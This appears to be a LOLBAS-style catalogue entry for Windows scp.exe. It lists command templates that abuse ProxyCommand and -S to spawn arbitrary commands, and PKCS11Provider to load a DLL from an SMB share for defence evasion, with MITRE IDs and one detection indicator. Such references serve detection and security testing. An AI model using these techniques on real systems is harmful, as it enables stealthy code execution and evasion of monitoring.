---
Acknowledgement:
- Handle: '@binfault'
  Person: BinFault
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
- Person: Edo Mal
Author: BinFault
Commands:
- Category: Execute
  Command: scp.exe -o ProxyCommand="{CMD}" . localhost:.
  Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH
    server is running on localhost (or any other address specified).
  MitreID: T1202
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Proxy execution of specified command, can be used as a defensive evasion.
- Category: Execute
  Command: scp.exe -S "{CMD}" . localhost:.
  Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH
    server is running on localhost (or any other address specified).
  MitreID: T1202
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Proxy execution of specified command, can be used as a defensive evasion.
- Category: Execute
  Command: scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
  Description: Loads a DLL from an absolute path or SMB path into child process `ssh.exe`
    by abusing the `PKCS11Provider` option. The payload executes upon DLL load (`DllMain`)
    and requires exporting `C_GetFunctionList` to prevent premature termination by
    `scp.exe`.
  MitreID: T1218
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Performs indirect execution of a specified DLL from a remote share, can
    be used for defense evasion.
Created: 2026-06-03
Description: Used for uploading or downloading files over SSH.
Detection:
- IOC: '`scp.exe` executions referencing `ProxyCommand`.'
Full_Path:
- Path: C:\Windows\System32\OpenSSH\scp.exe
Name: scp.exe
Resources:
- Link: https://gtfobins.org/gtfobins/scp/
- Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
mitre_data:
  technique_ids:
  - T1202
  - T1218
tags:
- lolbas/osbinaries
---

# scp.exe

Used for uploading or downloading files over SSH.

# Path(s)

- `C:\Windows\System32\OpenSSH\scp.exe`

# Execute Commands

Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).

```batch
scp.exe -o ProxyCommand="{CMD}" . localhost:.
```

- **Usecase:** Proxy execution of specified command, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10, Windows 11



Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).

```batch
scp.exe -S "{CMD}" . localhost:.
```

- **Usecase:** Proxy execution of specified command, can be used as a defensive evasion.
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows 10, Windows 11



Loads a DLL from an absolute path or SMB path into child process `ssh.exe` by abusing the `PKCS11Provider` option. The payload executes upon DLL load (`DllMain`) and requires exporting `C_GetFunctionList` to prevent premature termination by `scp.exe`.

```batch
scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
```

- **Usecase:** Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://gtfobins.org/gtfobins/scp/
- https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
# Acknowledgements

- BinFault (Authored, 2026-06-03)
- BinFault (@binfault)
- Nir Chako (Pentera) (@C_h4ck_0)
- Edo Mal